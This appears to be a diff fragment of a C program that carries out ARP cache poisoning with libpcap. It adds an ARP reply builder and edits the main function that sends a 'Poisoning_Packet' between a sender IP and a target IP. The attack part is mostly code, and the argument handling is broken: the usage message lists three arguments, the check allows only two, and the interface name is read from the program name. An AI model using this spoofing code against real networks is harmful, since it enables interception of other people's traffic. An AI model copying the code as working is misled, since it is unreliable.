@@ -15,6 +15,8 @@
 #define IP_ADDR_LEN 4
 #define SIZE_ETHER_HEADER 14
 
+
+//Including Pragma Pack
 #pragma pack(push,1)
 typedef struct ether_hdr{
 
@@ -39,10 +41,12 @@ typedef struct arp_pkt{
 }arppkt_t;
 #pragma pack(pop)
 
+// 1.Get HostMAC, HostIP 2.Get TargetMAC 3.Send Poisoning_Packet
 void GettingHostMAC(u_char* buffer, char* if_name);
 void GettingHostIP(struct in_addr* hostip, char* if_name);
 void GettingTargetMAC(pcap_t* handle, u_char* tmac, struct in_addr hostip, const u_char* hostmac, struct in_addr tip);
 void CreatingARP_request(u_char* arp_packet, struct in_addr sip, const u_char* smac, struct in_addr tip);
+void CreatingARP_reply(u_char* arp_packet, struct in_addr sip, const u_char* smac, struct in_addr tip, const u_char* tmac);
 void SendingPoisoning_Packet(pcap_t* handle, const u_char* hostmac, const u_char* smac, struct in_addr tip, struct in_addr sip);
 
 
@@ -50,7 +54,7 @@ int main(int argc, char * argv[])
 {
     if(argc != 3)
     {
-        fprintf(stderr,"Please Type: [INTERFACE_NAME] [SENDER_IP] [TARGET_IP]\n");
+        fprintf(stderr,"Please Type In: [NAME OF INTERFACE] [SENDER_IP] [TARGET_IP]\n");
         return 2;
     }
 
@@ -64,7 +68,7 @@ int main(int argc, char * argv[])
 
     if(handle == NULL)
     {
-        fprintf(stderr, "Couldn't open device! %s: %s\n", dev, errbuf);
+        fprintf(stderr, "Couldn't Open Device! %s: %s\n", dev, errbuf);
         return 2;
     }
 
@@ -78,11 +82,11 @@ int main(int argc, char * argv[])
 
     GettingHostMAC(hostmac, argv[0]);
     GettingHostIP(&hostip, argv[0]);
-    sip.s_addr = inet_addr(argv[1]);
-    tip.s_addr = inet_addr(argv[2]);
 
     printf("Sender IP: %s\n", argv[1]);
     printf("Target IP: %s\n", argv[2]);
+    sip.s_addr = inet_addr(argv[1]);
+    tip.s_addr = inet_addr(argv[2]);
 
     GettingTargetMAC(handle, smac, hostip, hostmac, sip);
     SendingPoisoning_Packet(handle, hostmac, smac, tip, sip);
